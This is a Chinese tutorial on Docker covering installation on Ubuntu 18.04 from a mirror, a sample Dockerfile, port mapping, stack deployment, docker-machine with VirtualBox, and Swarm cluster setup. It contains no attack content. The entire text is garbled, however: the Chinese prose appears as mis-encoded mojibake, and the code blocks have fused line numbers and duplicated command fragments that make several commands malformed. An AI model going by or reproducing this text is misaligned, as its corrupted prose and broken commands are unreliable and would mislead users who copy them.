å®¹å™¨ç”±äºè™šæ‹Ÿæœºå­˜åœ¨ä¸€äº›ç¼ºç‚¹ï¼ŒLinux å‘å±•å‡ºäº†å¦ä¸€ç§è½»é‡çº§çš„æ“ä½œç³»ç»Ÿè™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆï¼ŒLinux å®¹å™¨ï¼ˆLinux Containersï¼Œç¼©å†™ä¸º LXCï¼‰ã€‚ Linux å®¹å™¨ä¸æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œè€Œæ˜¯å¯¹è¿›ç¨‹è¿›è¡Œéš”ç¦»ã€‚ å®¹å™¨æ˜¯åº”ç”¨å±‚çš„æŠ½è±¡ï¼Œå®ƒå°†ä»£ç å’Œä¾èµ–å…³ç³»æ‰“åŒ…åœ¨ä¸€èµ·ã€‚ å¤šä¸ªå®¹å™¨å¯ä»¥åœ¨åŒä¸€å°æœºå™¨ä¸Šè¿è¡Œï¼Œå¹¶ä¸å…¶ä»–å®¹å™¨å…±äº«æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œæ¯ä¸ªå®¹å™¨åœ¨ç”¨æˆ·ç©ºé—´ä¸­ä½œä¸ºç‹¬ç«‹è¿›ç¨‹è¿è¡Œã€‚å®¹å™¨å ç”¨çš„ç©ºé—´æ¯”VMå°‘ï¼ˆå®¹å™¨æ˜ åƒçš„å¤§å°é€šå¸¸ä¸ºå‡ åMBï¼‰ï¼Œå¯ä»¥å¤„ç†æ›´å¤šçš„åº”ç”¨ç¨‹åºï¼Œå¹¶ä¸”éœ€è¦æ›´å°‘çš„VMå’Œæ“ä½œç³»ç»Ÿã€‚ ç”±äºå®¹å™¨æ˜¯è¿›ç¨‹çº§åˆ«çš„ï¼Œç›¸æ¯”è™šæ‹Ÿæœºæœ‰å¾ˆå¤šçš„ä¼˜åŠ¿ã€‚åé¢ä¼šåšæ¯”è¾ƒã€‚ Docker æ˜¯ä»€ä¹ˆDocker å±äºLinux å®¹å™¨çš„ä¸€ç§å°è£…ï¼Œæä¾›ç®€å•æ˜“ç”¨çš„å®¹å™¨ä½¿ç”¨æ¥å£ã€‚ å®ƒæ˜¯ç›®å‰æœ€æµè¡Œçš„ Linux å®¹å™¨è§£å†³æ–¹æ¡ˆã€‚ Docker ä¸è™šæ‹Ÿæœºçš„åŒºåˆ« åç§° å ç”¨èµ„æº å¯åŠ¨é€Ÿåº¦ çº§åˆ« Docker å ç”¨èµ„æºå°‘ å¯åŠ¨å¿« è½»é‡çº§ è™šæ‹Ÿæœº å ç”¨èµ„æºå¤š å¯åŠ¨æ…¢ é‡é‡çº§ Docker CE ä¸ Docker EEDocker CE(Docker Community Edition) æ˜¯ç¤¾åŒºç‰ˆï¼Œç®€å•ç†è§£æ˜¯å…è´¹ä½¿ç”¨ï¼Œæä¾›å°ä¼ä¸šä¸å°çš„ITå›¢é˜Ÿä½¿ç”¨,å¸Œæœ›ä»Dockerå¼€å§‹ï¼Œå¹¶å°è¯•åŸºäºå®¹å™¨çš„åº”ç”¨ç¨‹åºéƒ¨ç½²ã€‚ Docker EE(Docker Enterprise Edition) æ˜¯ä¼ä¸šç‰ˆï¼Œæ”¶è´¹ã€‚æä¾›åŠŸèƒ½æ›´å¼ºã€‚é€‚åˆå¤§ä¼ä¸šä¸æ‰“çš„ITå›¢é˜Ÿã€‚ä¸ºä¼ä¸šå¼€å‘å’ŒITå›¢é˜Ÿè®¾è®¡ï¼Œä»–ä»¬åœ¨ç”Ÿäº§ä¸­æ„å»ºã€äº¤ä»˜å’Œè¿è¡Œä¸šåŠ¡å…³é”®åº”ç”¨ç¨‹åº Docker CE æœ‰ä¸‰ç§ç±»å‹çš„æ›´æ–°é€šé“ï¼šstableã€testå’Œ nightly Stable æä¾›ä¸€èˆ¬å¯ç”¨æ€§çš„æœ€æ–°ç‰ˆæœ¬ Test æä¾›åœ¨ä¸€èˆ¬å¯ç”¨ä¹‹å‰å‡†å¤‡å¥½è¿›è¡Œæµ‹è¯•çš„é¢„å‘å¸ƒã€‚ Nightly æä¾›ä¸‹ä¸€ä¸ªä¸»è¦ç‰ˆæœ¬çš„æœ€æ–°æ­£åœ¨è¿›è¡Œçš„å·¥ä½œã€‚ å®‰è£… Docker-CEè¿™é‡Œä»¥Ubuntu 18.04 ä¸ºä¾‹ï¼š 1234561. sudo apt install apt-transport-https ca-certificates software-properties-common curl-transport-https ca-certificates software-properties-common curl2. curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add --fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -3. sudo add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\$(lsb_release -cs) stable&quot;4. sudo apt update5. sudo apt install docker-ce å°†å½“å‰ç”¨æˆ·æ·»åŠ åˆ°docker ç”¨æˆ·ç»„ï¼Œå¯ä»¥ä¸ç”¨sudo è¿è¡Œdocker 12$ sudo groupadd docker$ sudo usermod -aG docker $USER-aG docker $USER Docker é•œåƒDocker é•œåƒå°±æ˜¯ä¸€ä¸ªåªè¯»çš„æ¨¡æ¿ã€‚ ä¾‹å¦‚ï¼šä¸€ä¸ªé•œåƒå¯ä»¥åŒ…å«ä¸€ä¸ªå®Œæ•´çš„ ubuntu æ“ä½œç³»ç»Ÿç¯å¢ƒï¼Œé‡Œé¢ä»…å®‰è£…äº† Apache æˆ–ç”¨æˆ·éœ€è¦çš„å…¶å®ƒåº”ç”¨ç¨‹åºã€‚ é•œåƒå¯ä»¥ç”¨æ¥åˆ›å»º Docker å®¹å™¨ã€‚ Docker å®¹å™¨Docker åˆ©ç”¨å®¹å™¨æ¥è¿è¡Œåº”ç”¨ã€‚ å®¹å™¨æ˜¯ä»é•œåƒåˆ›å»ºçš„è¿è¡Œå®ä¾‹ã€‚å®ƒå¯ä»¥è¢«å¯åŠ¨ã€å¼€å§‹ã€åœæ­¢ã€åˆ é™¤ã€‚æ¯ä¸ªå®¹å™¨éƒ½æ˜¯ç›¸äº’éš”ç¦»çš„ã€ä¿è¯å®‰å…¨çš„å¹³å°ã€‚ å¯ä»¥æŠŠå®¹å™¨çœ‹åšæ˜¯ä¸€ä¸ªç®€æ˜“ç‰ˆçš„ Linux ç¯å¢ƒï¼ˆåŒ…æ‹¬rootç”¨æˆ·æƒé™ã€è¿›ç¨‹ç©ºé—´ã€ç”¨æˆ·ç©ºé—´å’Œç½‘ç»œç©ºé—´ç­‰ï¼‰å’Œè¿è¡Œåœ¨å…¶ä¸­çš„åº”ç”¨ç¨‹åºã€‚ æ³¨ï¼šé•œåƒæ˜¯åªè¯»çš„ï¼Œå®¹å™¨åœ¨å¯åŠ¨çš„æ—¶å€™åˆ›å»ºä¸€å±‚å¯å†™å±‚ä½œä¸ºæœ€ä¸Šå±‚ã€‚ Docker ä»“åº“ä»“åº“æ˜¯é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœºæ‰€ã€‚æœ‰æ—¶å€™ä¼šæŠŠä»“åº“å’Œä»“åº“æ³¨å†ŒæœåŠ¡å™¨ï¼ˆRegistryï¼‰æ··ä¸ºä¸€è°ˆï¼Œå¹¶ä¸ä¸¥æ ¼åŒºåˆ†ã€‚å®é™…ä¸Šï¼Œä»“åº“æ³¨å†ŒæœåŠ¡å™¨ä¸Šå¾€å¾€å­˜æ”¾ç€å¤šä¸ªä»“åº“ï¼Œæ¯ä¸ªä»“åº“ä¸­åˆåŒ…å«äº†å¤šä¸ªé•œåƒï¼ˆimageï¼‰ï¼Œæ¯ä¸ªé•œåƒæœ‰ä¸åŒçš„æ ‡ç­¾ï¼ˆtagï¼‰ã€‚ ä»“åº“åˆ†ä¸ºå…¬å¼€ä»“åº“ï¼ˆPublicï¼‰å’Œç§æœ‰ä»“åº“ï¼ˆPrivateï¼‰ä¸¤ç§å½¢å¼ã€‚ æœ€å¤§çš„å…¬å¼€ä»“åº“æ˜¯ Docker Hubï¼Œå­˜æ”¾äº†æ•°é‡åºå¤§çš„é•œåƒä¾›ç”¨æˆ·ä¸‹è½½ã€‚ å›½å†…çš„å…¬å¼€ä»“åº“åŒ…æ‹¬ Docker Pool ç­‰ï¼Œå¯ä»¥æä¾›å¤§é™†ç”¨æˆ·æ›´ç¨³å®šå¿«é€Ÿçš„è®¿é—®ã€‚ å½“ç„¶ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥åœ¨æœ¬åœ°ç½‘ç»œå†…åˆ›å»ºä¸€ä¸ªç§æœ‰ä»“åº“ã€‚ å½“ç”¨æˆ·åˆ›å»ºäº†è‡ªå·±çš„é•œåƒä¹‹åå°±å¯ä»¥ä½¿ç”¨ push å‘½ä»¤å°†å®ƒä¸Šä¼ åˆ°å…¬æœ‰æˆ–è€…ç§æœ‰ä»“åº“ï¼Œè¿™æ ·ä¸‹æ¬¡åœ¨å¦å¤–ä¸€å°æœºå™¨ä¸Šä½¿ç”¨è¿™ä¸ªé•œåƒæ—¶å€™ï¼Œåªéœ€è¦ä»ä»“åº“ä¸Š pull ä¸‹æ¥å°±å¯ä»¥äº†ã€‚ æ³¨ï¼šDocker ä»“åº“çš„æ¦‚å¿µè·Ÿ Git ç±»ä¼¼ï¼Œæ³¨å†ŒæœåŠ¡å™¨å¯ä»¥ç†è§£ä¸º GitHub è¿™æ ·çš„æ‰˜ç®¡æœåŠ¡ã€‚ é•œåƒå’Œå®¹å™¨çš„åŒºåˆ«å®¹å™¨å’Œé•œåƒçš„å…³ç³»å¦‚ä¸‹ï¼š Dockerfileç”¨äºå®šä¹‰é•œåƒï¼Œä¾èµ–é•œåƒæ¥è¿è¡Œå®¹å™¨ï¼Œä»“åº“åˆ™æ˜¯å­˜æ”¾é•œåƒçš„åœ°æ–¹ã€‚ Dockerfile æ˜¯ä»€ä¹ˆï¼ŸDockerfile æ˜¯ä¸€ä¸ªåˆ›å»ºDocker é•œåƒæ‰€éœ€çš„æ–‡ä»¶ï¼Œå…¶ä¸­ä¼šåŒ…å«ä¸€ç»„æŒ‡ä»¤æ¥å‘Šè¯‰Docker å¦‚ä½•æ„å»ºæˆ‘ä»¬çš„é•œåƒã€‚ ç¤ºä¾‹ï¼š 123456789101112131415161718192021$ cat Dockerfile# ä½¿ç”¨å®˜æ–¹Pythonè¿è¡Œæ—¶ä½œä¸ºçˆ¶æ˜ åƒFROM python:2.7-slim# å°†å·¥ä½œç›®å½•è®¾ç½®ä¸º&#x2F;appWORKDIR &#x2F;app# å°†å½“å‰ç›®å½•å†…å®¹å¤åˆ¶åˆ°å®¹å™¨at &#x2F;appCOPY . &#x2F;app# å®‰è£…requirements.txtä¸­æŒ‡å®šçš„ä»»ä½•éœ€è¦çš„åŒ…RUN pip install --trusted-host pypi.python.org -r requirements.txt# #è®©80 ç«¯å£å·å¯¹å¤–å¼€æ”¾EXPOSE 80# å®šä¹‰ç¯å¢ƒå˜é‡ENV NAME World# åœ¨å®¹å™¨å¯åŠ¨æ—¶è¿è¡Œapp.pyCMD [&quot;python&quot;, &quot;app.py&quot;] å¦‚ä½•ç”¨é•œåƒåˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼Ÿé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªé•œåƒï¼Œç„¶åæ‰èƒ½åˆ›å»ºå®¹å™¨ã€‚æƒ³è¦åœ¨Docker ä¸Šåˆ›å»ºä¸€ä¸ªé•œåƒï¼Œéå¸¸ç®€å•ã€‚ cd åˆ°é¡¹ç›®æ–‡ä»¶å¤¹ä¸­ ä½¿ç”¨ docker build --tag=mydockerapp . å‘½ä»¤ï¼Œåˆ›å»ºä¸€ä¸ªDocker é•œåƒã€‚â€“tag é€‰é¡¹å‘½åã€‚ ä½¿ç”¨ docker run -d -p 4000:80 mydockerappå‘½ä»¤ï¼Œåˆ›å»ºä¸€ä¸ªæ–°å®¹å™¨ã€‚ è¯¥å‘½ä»¤è¡¨ç¤ºï¼šDocker ä»¥mydockerappé•œåƒåˆ›å»ºä¸€ä¸ªæ–°å®¹å™¨ï¼ŒåŒæ—¶ä»¥åˆ†ç¦»æ¨¡å¼åœ¨åå°è¿è¡Œè¯¥åº”ç”¨ç¨‹åºï¼Œå°†è¯¥å®¹å™¨çš„80ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„4000ç«¯å£ã€‚ å…¶ä¸­ï¼š-dï¼šè®©å®¹å™¨åœ¨åå°è¿è¡Œ-pï¼šå°†å®¹å™¨å†…éƒ¨ç«¯å£æ˜ å°„åˆ°æŒ‡å®šçš„ä¸»æœºç«¯å£ä¸Šã€‚-P :æ˜¯å®¹å™¨å†…éƒ¨ç«¯å£éšæœºæ˜ å°„åˆ°ä¸»æœºçš„ç«¯å£ä¸Šã€‚ Docker ç½‘ç»œç«¯å£æ˜ å°„ä½¿ç”¨å‘½ä»¤ï¼š 1$ docker run -p 4000:80 mydocker ç„¶åç”¨docker container lsæŸ¥çœ‹å®¹å™¨åˆ—è¡¨ ä¸‹å›¾çš„æ„æ€è¡¨ç¤ºï¼šå°†è¯¥å®¹å™¨çš„ç«¯å£80æ˜ å°„åˆ°4000ï¼Œä»è€Œç”Ÿæˆæ­£ç¡®çš„URL http://localhost:4000ã€‚ Docker å¼€æ”¾äº† 80 ç«¯å£æ˜ å°„åˆ°ä¸»æœºç«¯å£ 4000 ä¸Šã€‚ Docker å®¹å™¨è¿æ¥å‰é¢æˆ‘ä»¬å®ç°äº†é€šè¿‡ç½‘ç»œç«¯å£æ¥è®¿é—®è¿è¡Œåœ¨ docker å®¹å™¨å†…çš„æœåŠ¡ã€‚ä¸‹é¢æˆ‘ä»¬æ¥å®ç°é€šè¿‡ç«¯å£è¿æ¥åˆ°ä¸€ä¸ª docker å®¹å™¨ å¦‚ä½•è¿è¡Œè´Ÿè½½å‡è¡¡åº”ç”¨ï¼Ÿåœ¨å¼€å§‹ä¹‹å‰ï¼Œä½ å¾—é¦–å…ˆæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š å®‰è£…Docker 1.13æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚ äº†è§£å¦‚ä½•åˆ›å»ºå®¹å™¨ã€‚ ç¡®ä¿å·²ç»åˆ›å»ºé•œåƒå¹¶å‘å¸ƒåˆ°æ³¨å†Œè¡¨ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œéœ€è¦ä½¿ç”¨è¯¥å…±äº«é•œåƒã€‚ ç¡®ä¿é•œåƒä½œä¸ºå·²éƒ¨ç½²çš„å®¹å™¨è¿è¡Œï¼Œå¹¶èƒ½è®¿é—®ã€‚ ç¡®ä¿æœ‰docker-compose.ymlé…ç½®æ–‡ä»¶ï¼Œç„¶åä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ 1234567$ docker swarm init$ docker stack deploy -c docker-compose.yml getstartedlab# é¡ºåˆ©çš„è¯ï¼Œå°±èƒ½ç›´æ¥éƒ¨ç½²æˆåŠŸäº†ã€‚ä½¿ç”¨docker container ls å¯ä»¥çœ‹åˆ°æ­£åœ¨è¿è¡Œçš„å®ä¾‹ã€‚# ä½¿ç”¨ curl http:&#x2F;&#x2F;localhost:4000 æˆ–è€…æ˜¯åˆ·æ–°æµè§ˆå™¨ã€‚# æ— è®ºä»¥å“ªç§æ–¹å¼ï¼Œå®¹å™¨ID éƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚ä»è€Œè¯æ˜è´Ÿè½½å‡è¡¡æˆåŠŸã€‚# å¯¹äºæ¯ä¸ªè¯·æ±‚ï¼Œä»¥å¾ªç¯æ–¹å¼é€‰æ‹©5ä¸ªä»»åŠ¡ä¸­çš„ä¸€ä¸ªæ¥å“åº”ã€‚# å®¹å™¨IDä¸ä¸Šä¸€ä¸ªå‘½ä»¤ï¼ˆdocker container ls -qï¼‰çš„è¾“å‡ºåŒ¹é…ã€‚ å…³äºæœåŠ¡åœ¨åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºä¸­ï¼Œåº”ç”¨ç¨‹åºçš„ä¸åŒéƒ¨åˆ†ç§°ä¸ºâ€œæœåŠ¡â€ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æƒ³è±¡ä¸€ä¸ªè§†é¢‘å…±äº«ç«™ç‚¹ï¼Œå®ƒå¯èƒ½åŒ…æ‹¬ä¸€ä¸ªç”¨äºåœ¨æ•°æ®åº“ä¸­å­˜å‚¨åº”ç”¨ç¨‹åºæ•°æ®çš„æœåŠ¡ï¼Œä¸€ä¸ªç”¨æˆ·åœ¨ä¸Šä¼ å†…å®¹ååœ¨åå°è¿›è¡Œè§†é¢‘è½¬ç çš„æœåŠ¡ï¼Œä¸€ä¸ªç”¨äºå‰ç«¯çš„æœåŠ¡ï¼Œç­‰ç­‰ã€‚ æœåŠ¡å®é™…ä¸Šåªæ˜¯â€œç”Ÿäº§ä¸­çš„å®¹å™¨â€ã€‚æœåŠ¡åªè¿è¡Œä¸€ä¸ªé•œåƒï¼Œä½†å®ƒç¼–ç äº†é•œåƒè¿è¡Œçš„æ–¹å¼ - å®ƒåº”è¯¥ä½¿ç”¨å“ªäº›ç«¯å£ï¼Œåº”è¯¥è¿è¡Œå¤šå°‘ä¸ªå®¹å™¨å‰¯æœ¬ï¼Œä»¥ä¾¿æœåŠ¡å…·æœ‰æ‰€éœ€çš„å®¹é‡ï¼Œä»¥åŠç­‰ç­‰ã€‚æ‰©å±•æœåŠ¡ä¼šæ›´æ”¹è¿è¡Œè¯¥è½¯ä»¶çš„å®¹å™¨å®ä¾‹çš„æ•°é‡ï¼Œä»è€Œä¸ºæµç¨‹ä¸­çš„æœåŠ¡åˆ†é…æ›´å¤šè®¡ç®—èµ„æºã€‚ åœ¨æœåŠ¡ä¸­è¿è¡Œçš„å•ä¸ªå®¹å™¨ç§°ä¸ºä»»åŠ¡ã€‚ä»»åŠ¡è¢«èµ‹äºˆä»¥æ•°å­—é€’å¢çš„å”¯ä¸€IDï¼Œæœ€å¤šä¸ºreplicasæ‚¨å®šä¹‰ çš„æ•°é‡docker-compose.ymlã€‚ å¹¸è¿çš„æ˜¯ï¼Œä½¿ç”¨Dockerå¹³å°å®šä¹‰ï¼Œè¿è¡Œå’Œæ‰©å±•æœåŠ¡éå¸¸å®¹æ˜“ - åªéœ€ç¼–å†™ä¸€ä¸ªdocker-compose.ymlæ–‡ä»¶å³å¯ã€‚ å¦‚ä½•åœ¨Dockerä¸Šå®‰è£… Docker Machineï¼ŸUbuntu 18.04 è¯·çœ‹æ–‡æœ«çš„å‚è€ƒé“¾æ¥ã€‚ MacOS å¦‚æœæ˜¯ä»DockerHubå®˜ç½‘ä¸‹è½½çš„dmg å®‰è£…çš„Dockerï¼Œä¸ç”¨æ‹…å¿ƒï¼ŒDocker-Machine å·²ç»å®‰è£…å¥½äº†ã€‚ å¦‚ä½•å®‰è£…VirtualBoxï¼ŸUbuntu 18.04 è¯·çœ‹æ–‡æœ«çš„å‚è€ƒé“¾æ¥ã€‚ MacOS åˆ™éœ€è¦ä»virtualboxå®˜ç½‘ä¸‹è½½dmgå®‰è£…åŒ…ã€‚ ä½ å¯èƒ½ä¼šé‡åˆ°ä¸€ä¸ªé”™è¯¯ï¼Œå‚è€ƒè§£å†³ï¼šå¦‚ä½•åœ¨MacOSä¸Šå®‰è£…VirtualBox äº†è§£Swarmé›†ç¾¤ç¾¤ç”±å¤šä¸ªèŠ‚ç‚¹ç»„æˆï¼Œå¯ä»¥æ˜¯ç‰©ç†æˆ–è™šæ‹Ÿæœºã€‚åŸºæœ¬æ¦‚å¿µå¾ˆç®€å•ï¼šè¿è¡Œdocker swarm initä»¥å¯ç”¨swarmæ¨¡å¼å¹¶ä½¿å½“å‰è®¡ç®—æœºæˆä¸ºä¸€ä¸ªswarmç®¡ç†å™¨ã€‚ è¿™ä¸ªç« èŠ‚æ˜¯è¿™ä¸ªæ–‡æ¡£ç³»åˆ—ä¸­å­¦çš„æ—¶é—´æœ€é•¿çš„ï¼Œå‘æœ‰ç‚¹å¤šï¼Œèµ°äº†ä¸å°‘å¼¯è·¯ï¼Œè¿™ä¸€èŠ‚ä¹ŸæŒºé‡è¦çš„ é‡ç‚¹è®°ä¸‹ç¬”è®°ã€‚ åœ¨MacOS ä¸‹ï¼Œéƒ¨åˆ†å‘½ä»¤éœ€è¦ sudo æƒé™ã€‚ åˆ›å»ºä¸€ä¸ªé›†ç¾¤ï¼ˆæœ¬åœ°è®¡ç®—æœºçš„VMï¼‰åœ¨å¼€å§‹è¿™éƒ¨åˆ†ä¹‹å‰ï¼Œéœ€è¦æå‰å®‰è£…å¥½Oracle VirtualBox. 1$ docker-machine create --driver virutalbox myvm1 å¦‚æœä½ æ”¶åˆ°äº†è¿™æ ·çš„ä¿¡æ¯ï¼š 12$ Error with pre-create check: &quot;VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path&quot; è¯´æ˜ä½ çš„Vritualboxè¿˜æ˜¯æ²¡æœ‰å®‰è£…å¥½ã€‚ æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„VM 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.104:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.105:2376 v17.06.2-ce è¿™æ ·å°±æˆåŠŸçš„åˆ›å»ºäº†ä¸€å°VMï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦å°†è¿™å°æœºå™¨ä½œä¸ºç®¡ç†å™¨ï¼Œç¬¬äºŒå°ä½œä¸ºå·¥ä½œè€…ã€‚ å¦å¤–å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå°½ç®¡æˆ‘åœ¨Ubuntu 18.04 ä¸Šåˆ†åˆ«å®‰è£…å¥½äº†docker-machineã€virtualboxï¼Œä½†å½“æˆ‘åˆ›å»º VM æ—¶ï¼Œæ€»æ˜¯ä¼šæç¤ºæˆ‘è®¡ç®—æœºæ²¡æœ‰å¼€å¯ä»€ä¹ˆè™šæ‹ŸåŒ–ï¼ˆBOISï¼‰ã€‚ åæ¥æˆ‘å¤§æ¦‚æƒ³æ˜ç™½äº†ï¼Œå¯èƒ½æ˜¯æˆ‘çš„é‚£å°æœåŠ¡å™¨çš„é…ç½®å¤ªä½äº†ï¼ŒçœŸçš„æ˜¯æŸä¸ªè®¾ç½®é¡¹æ²¡æœ‰å¯åŠ¨å¯¼è‡´çš„ã€‚ ä»Šå¤©åœ¨MacBook ä¸Šé‡æ–°æ“ä½œäº†ä¸€è¾¹ï¼Œå¼‚å¸¸é¡ºåˆ©ã€‚ è®°å½•ä¸€ä¸ªé—®é¢˜ï¼šä½¿ç”¨docker-machine create --driver virtualbox myvm1åˆ›å»ºVMæ—¶ï¼Œåˆ›å»ºæˆåŠŸäº†ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯æˆ‘æƒ³è¦çš„å®ä¾‹ã€‚å¾—åˆ°äº†ä»¥ä¸‹ä¿¡æ¯ï¼š 1234(default) Creating a new host-only adapter produced an error: hostonlyif create failed:(default) 0%...(default) Progress state: E_FAIL(default) VBoxManage.exe: error: Failed to create the host-only adapter æ‰¾äº†å¥½ä¹…ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç­”æ¡ˆï¼Œæœ€åæ˜¯æ€ä¹ˆè§£å†³çš„å‘¢ï¼Ÿé‡å¯æœºå™¨ï¼ˆåŠ ä¸Š sudoï¼‰ã€‚ å¯åŠ¨\\åœæ­¢ VM 12$ docker-machine start Name$ docker-machine stop Name åˆå§‹åŒ–Swarm å¹¶æ·»åŠ èŠ‚ç‚¹è¿™é‡Œæ˜¯ä¸€ä¸ªå°å‘ï¼Œä¹‹å‰åœ¨è¿™é‡Œæ ½äº†å¥½ä¹…ã€‚ è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼åˆå§‹åŒ–èŠ‚ç‚¹æˆ–è€…è¯´æ“ä½œ VMï¼ˆæ¨èç¬¬ä¸€ç§ï¼‰ï¼š ssh è¿æ¥VM å®ä¾‹ï¼Œåœ¨Docker VM Cli ä¸­æ‰§è¡Œå‘½ä»¤ 1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# &lt;myvm1 ip&gt; æŒ‡docker-machine ls å¯¹åº”çš„ ip# æ­£å¸¸ä¼šå¾—åˆ°è¿™æ ·ä¸€ä¸ªè¾“å‡ºTo add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377 å°†myvm2 å®ä¾‹ä½œä¸ºå·¥ä½œè€…åŠ å…¥ï¼ˆæ–¹å¼ä¸€ï¼‰1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377# æˆåŠŸï¼Œä¼šå¾—åˆ°è¿™æ ·çš„è¾“å‡ºThis node joined a swarm as a worker. ç›´æ¥é€šè¿‡ docker-machine ssh myvm1 æ‰§è¡Œç›¸åº”å‘½ä»¤ 12$ docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# åŒä¸Š å°†myvm2 å®ä¾‹ä½œä¸ºå·¥ä½œè€…åŠ å…¥ï¼ˆæ–¹å¼äºŒï¼‰æ‰§è¡Œä¸Šé¢å¾—åˆ°çš„è¾“å‡ºï¼š 123456$ docker-machine ssh myvm2 &quot; docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377&quot;# æˆåŠŸï¼Œä¼šå¾—åˆ°è¿™æ ·çš„è¾“å‡ºThis node joined a swarm as a worker. è¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸçš„åˆ›å»ºäº†ä¸€ä¸ªé›†ç¾¤ï¼Œå¹¶å°†ä¸€ä¸ªå·¥ä½œè€…ä½œä¸ºä¸€ä¸ªèŠ‚ç‚¹åŠ å…¥äº†ã€‚ åœ¨ç®¡ç†å™¨ä¸ŠæŸ¥çœ‹é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ï¼š1234docker@myvm1: $ docker node lsID HOSTNAME STATUS AVAILABILITY MANAGER STATUSrihwohkh3ph38fhillhhb84sk * myvm1 Ready Active Leaderbrtu9urxwfd5j0zrmkubhpkbd myvm2 Ready Active ä¸ºä»€ä¹ˆä¸Šé¢è¦ä»‹ç»é‚£ä¸¤ç§ä¸ VM å®ä¾‹è¿›è¡Œäº¤äº’çš„æ–¹å¼å‘¢ï¼Ÿ å› ä¸ºä¼šå’Œåé¢çš„åœ¨é›†ç¾¤éƒ¨ç½²åº”ç”¨ç¨‹åºæœ‰ä¸€å®šè”ç³»ã€‚ åœ¨é›†ç¾¤ä¸­éƒ¨ç½²åº”ç”¨ç¨‹åºåœ¨å¼€å§‹éƒ¨ç½²ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£åˆ°æœ‰ä¸¤ç§æ–¹å¼å¯ä»¥å®ç°ã€‚ docker-machine ä¸ºSwarm ç®¡ç†å™¨é…ç½®Shell åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä¸ VM é€šä¿¡éƒ½æ˜¯é€šè¿‡ docker-machine sshè¿™ç§æ–¹å¼ï¼Œå¦ä¸€ç§æ›´å¥½çš„æ–¹å¼å°±æ˜¯ï¼šå°†å½“å‰shellé…ç½®ä¸ºä¸VMä¸Šçš„Dockerå®ˆæŠ¤ç¨‹åºé€šä¿¡ã€‚ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æœ¬åœ°çš„docker-compose.ymlæ–‡ä»¶è¿œç¨‹éƒ¨ç½²åº”ç”¨ç¨‹åºï¼Œè€Œæ— éœ€å°†å…¶å¤åˆ¶åˆ°å…¶ä»–ä»»ä½•ä½ç½®ã€‚ 12345678910$ docker-machine env myvm1export DOCKER_TLS_VERIFY&#x3D;&quot;1&quot;export DOCKER_HOST&#x3D;&quot;tcp:&#x2F;&#x2F;192.168.99.100:2376&quot;export DOCKER_CERT_PATH&#x3D;&quot;&#x2F;Users&#x2F;sam&#x2F;.docker&#x2F;machine&#x2F;machines&#x2F;myvm1&quot;export DOCKER_MACHINE_NAME&#x3D;&quot;myvm1&quot;# Run this command to configure your shell:# eval $(docker-machine env myvm1)# è¿è¡Œæœ€åä¸€è¡Œå‘½ä»¤ä»¥é…ç½®ä¸ä¹‹é€šä¿¡çš„ shell $ eval $(docker-machine env myvm1) # eval $(sudodocker-machine env myvm1) è¿è¡Œdocker-machine ls å·²éªŒè¯ myvm1 ç°åœ¨æ˜¯æ´»åŠ¨çš„è®¡ç®—æœºã€‚å¸¦æœ‰æ˜Ÿå·ï¼ˆ*ï¼‰è¡¨ç¤ºé…ç½®æˆåŠŸ 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER 